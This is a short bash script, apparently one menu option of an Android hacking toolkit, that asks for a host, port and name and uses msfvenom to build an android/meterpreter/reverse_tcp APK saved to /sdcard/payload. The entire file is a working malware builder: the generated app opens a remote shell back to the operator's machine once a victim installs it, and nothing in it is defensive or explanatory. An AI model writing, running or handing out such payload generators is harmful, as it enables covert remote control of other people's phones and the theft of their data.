#!/bin/bash

#	colors
r='\033[1;31m'
g='\033[1;32m'
y='\033[1;33m'
echo -e "$g                  Create$r Payload$y Android"
echo -e "$y"
echo -e "$y"
echo -e "                                        $r[$g 0 $r]$g BaCk"
echo -e "$g"
read -p "Enter Host ~: " host
if [ $host -eq 0 ];then
python droid-sec.py
exit
fi
read -p "Enter Port ~: " port
read -p "Enter Name ~: " name
echo -e "$g"
mkdir /sdcard/payload
clear
msfvenom -p android/meterpreter/reverse_tcp LHOST=$host LPORT=$port R >  /sdcard/payload/$name.apk
clear
echo "  $y    Saved payload /sdcard/payload/$g"
read -p "Enter BaCk ..."
python droid-sec.py
